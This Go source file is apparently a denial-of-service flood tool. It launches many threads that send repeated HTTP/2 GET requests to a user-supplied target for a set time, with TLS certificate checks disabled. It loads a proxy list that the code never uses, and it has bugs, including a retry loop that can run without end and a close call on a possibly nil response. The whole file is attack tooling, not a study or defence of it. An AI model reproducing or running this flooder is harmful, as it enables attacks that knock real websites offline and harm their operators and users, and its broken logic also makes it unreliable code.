package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var proxies []string

func http2(wg *sync.WaitGroup, target string, rps int, config *tls.Config) {
	defer wg.Done()

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:   config,
			ForceAttemptHTTP2: true,
		},
	}

	req, _ := http.NewRequest("GET", target, nil)
	// Set headers here

	for i := 0; i < rps; i++ {
		resp, err := client.Do(req)
		if err != nil || (resp.StatusCode >= 400 && resp.StatusCode != 404) {
			i-- // Retry on error
		}
		resp.Body.Close()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 6 {
		fmt.Println("[FIX] go run TLS.go target time ratelimit proxyfile threads")
		return
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	rps, _ := strconv.Atoi(os.Args[3])
	proxylist := os.Args[4]
	threads, _ := strconv.Atoi(os.Args[5])

	file, err := os.Open(proxylist)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}

	if len(proxies) == 0 {
		fmt.Println("No proxies found in the file")
		return
	}

	config := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2"},
		// Set your curve preferences and cipher suites
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go http2(&wg, target, rps, config)
		time.Sleep(1 * time.Millisecond)
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		os.Exit(0)
	}()

	wg.Wait()
}
